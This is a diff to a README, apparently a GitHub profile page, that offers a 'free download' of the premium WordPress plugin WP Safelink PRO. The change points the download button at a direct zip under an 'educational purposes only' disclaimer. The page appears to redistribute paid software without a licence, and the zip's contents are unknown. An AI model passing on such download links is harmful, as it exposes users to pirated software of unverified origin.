@@ -1,5 +1,3 @@
-# WP Safelink PRO – Free Download
-
 ![WP Safelink PRO](https://github.com/WP-Safelink-PRO/.github/blob/main/wp-safelink-logo.png?raw=true)
 
 ## 🔗 Monetize Your Outbound Links Easily
@@ -19,7 +17,7 @@ WP Safelink PRO is a premium WordPress plugin that converts your outbound links 
 
 > ⚠️ **Disclaimer:** This download is for educational and testing purposes only. Please support the developers by purchasing an official license for production use.
 
-[**⬇️ Download WP Safelink PRO v4.0.1**](https://github.com/wp-safelink-pro)
+[**⬇️ Download WP Safelink PRO v4.0.1**](https://github.com/WP-Safelink-PRO/.github/releases/download/wp/wp_safelink_pro.zip)
 
 ---
 
